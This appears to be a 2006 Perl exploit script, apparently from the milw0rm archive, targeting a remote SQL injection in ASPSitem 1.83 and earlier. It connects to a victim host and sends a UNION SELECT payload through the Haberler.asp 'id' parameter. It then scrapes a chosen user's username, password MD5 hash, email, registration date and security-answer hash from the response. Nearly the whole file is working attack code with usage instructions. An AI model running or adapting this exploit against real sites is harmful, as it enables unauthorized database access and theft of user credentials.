#!/usr/bin/perl
#Method found & Exploit scripted by nukedx
#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Original advisory: http://www.nukedx.com/?viewdoc=23
#Usage: aspsi.pl <host> <path> <userid>
use IO::Socket;
if(@ARGV != 3) { usage(); }
else { exploit(); }
sub header()
{
  print "\n- NukedX Security Advisory Nr.2006-23\r\n";
  print "- ASPSitem <= 1.83 Remote SQL Injection Exploit\r\n";
}
sub usage() 
{
  header();
  print "- Usage: $0 <host> <path>\r\n";
  print "- <host> -> Victim's host ex: www.victim.com\r\n";
  print "- <path> -> Path to ASPSitem ex: /aspsitem/\r\n";
  print "- <userid> -> ID of user that you want info ex: 1\r\n";
  exit();
}
sub exploit () 
{
  #Our variables...
  $asserver = $ARGV[0];
  $asserver =~ s/(http:\/\/)//eg;
  $ashost   = "http://".$asserver;
  $asdir    = $ARGV[1];
  $asport   = "80";
  $astar    = "Haberler.asp?haber=devam&id=";
  $asxp     = "-1%20UNION%20SELECT%20cevap,id,0,kulladi,sifre,kayittarih,email%20FROM%20uyeler%20where%20id%20like%20".$ARGV[2];
  $asreq    = $ashost.$asdir.$astar.$asxp;
  #Sending data...
  header();
  print "- Trying to connect: $asserver\r\n";
  $as = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$asserver", PeerPort => "$asport") || die "- Connection failed...\n";
  print $as "GET $asreq HTTP/1.1\n";
  print $as "Accept: */*\n";
  print $as "Referer: $ashost\n";
  print $as "Accept-Language: tr\n";
  print $as "User-Agent: NukeZilla\n";
  print $as "Cache-Control: no-cache\n";
  print $as "Host: $asserver\n";
  print $as "Connection: close\n\n";
  print "- Connected...\r\n";
  while ($answer = <$as>) {
    if ($answer =~ /class=\"tablo_baslik\"><b>� (.*?)<\/b><\/td>/) {
      if ($1 == $ARGV[2]) {
        print "- Exploit succeed! Getting USERID: $ARGV[2]'s credentials\r\n";
      }
      else { die "- Exploit failed\n"; }     
    }
    if ($answer =~ /\" align=\"left\">(.*?)</) {
      print "- Username: $1\r\n";
    }
    if ($answer =~ /Ekleyen&nbsp;&nbsp;\(<b>(.*?)<\/b>\)/) {
      print "- MD5 HASH of PASSWORD: $1\r\n";
    }
    if ($answer =~ /\| (.*?) ]<br>/) {
      print "- Regdate: $1\r\n";
    }
    if ($answer =~ /haber=yorum&id=(.*?)\">Yorumlar/) {
      print "- Email: $1\r\n";
    }
    if ($answer =~ / Okunma : (.*?) /) {
      print "- MD5 hash of answer: $1\r\n";
      exit();
    }
  }
  #Exploit failed...
  print "- Exploit failed\n"
}

#nukedx.com [2006-04-19]

# milw0rm.com [2006-04-19]
